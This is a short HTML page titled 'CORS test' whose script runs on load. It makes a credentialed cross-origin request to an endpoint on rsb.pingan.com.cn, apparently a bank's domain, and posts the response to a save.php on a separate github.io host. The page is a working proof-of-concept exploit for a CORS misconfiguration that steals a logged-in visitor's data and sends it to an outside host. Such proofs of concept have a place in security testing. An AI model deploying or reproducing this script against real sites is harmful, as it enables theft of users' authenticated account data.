<h1>CORS test</h1>
<script>
function loadXMLDoc() {
    var xhr1;
    var xhr2;
    
    if (window.XMLHttpRequest) {
        xhr1 = new XMLHttpRequest();
        xhr2 = new XMLHttpRequest();
    } else {
        xhr1 = new ActiveXObject("Microsoft.XMLHTTP");
        xhr2 = new ActiveXObject("Microsoft.XMLHTTP");
    }
    
    xhr1.onreadystatechange = function() {
        if (xhr1.readyState == 4 && xhr1.status == 200) {
            var datas = xhr1.responseText;
            xhr2.open("POST", "https://chunliunai.github.io/save.php", "true");
            alert('3');
            xhr2.setRequestHeader("Content-type", "application/x-www-form-urlencoded;charset=utf-8");
            xhr2.send("T1=" + escape(datas));
        }
    }
    
    xhr1.open("GET", "https://rsb.pingan.com.cn/itam/mas/linden/ip/request", "true");
    alert(xhr1.responseText);
    xhr1.withCredentials = true;
    xhr1.send();
}

loadXMLDoc();
</script>
